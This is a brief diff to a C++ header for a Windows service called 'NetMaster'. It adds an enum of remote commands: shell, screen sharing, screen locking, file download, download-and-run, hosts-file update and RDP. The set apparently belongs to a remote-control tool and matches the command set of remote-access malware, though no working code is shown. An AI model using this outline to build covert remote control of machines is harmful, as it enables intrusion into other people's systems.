@@ -14,3 +14,15 @@
 #define SERVICE_NAME L"NetMaster"
 void _stdcall _Main();
 extern std::vector<HANDLE> processes;
+
+enum COMMAND {
+	CMD=1,
+	SCREENSHARE,
+	LOCKSCREEN,
+	UNLOCKSCREEN,
+	FILEDOWNLOAD,
+	FILEDOWNLOADRUN,
+	UPDATEHOSTS,
+	RDPCMD
+
+};
